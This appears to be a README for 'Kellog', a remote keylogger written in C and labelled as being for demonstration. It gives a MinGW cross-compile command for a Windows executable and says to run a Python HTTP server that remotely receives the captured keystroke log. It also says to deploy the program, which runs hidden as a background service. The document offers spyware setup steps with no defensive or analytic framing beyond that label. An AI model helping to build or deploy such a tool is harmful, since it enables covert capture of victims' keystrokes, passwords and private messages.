# Kellog
This is a remote keylogger coded in C, used for demonstration purposes


# TO COMPILE
Note* compiled for windows using linux
To compile it run: i686-w64-mingw32-g++ -static-libstdc++ -static-libgcc -o kellog.exe Kellog.c 

# HOW TO USE
create an simple python server to collect the log files with python3 -m http.server 8080
The log file (called "KellogLogs.txt") should be remotely received

deploy Kellog.exe and run it
  - it should automatically run as a background service called "kellog
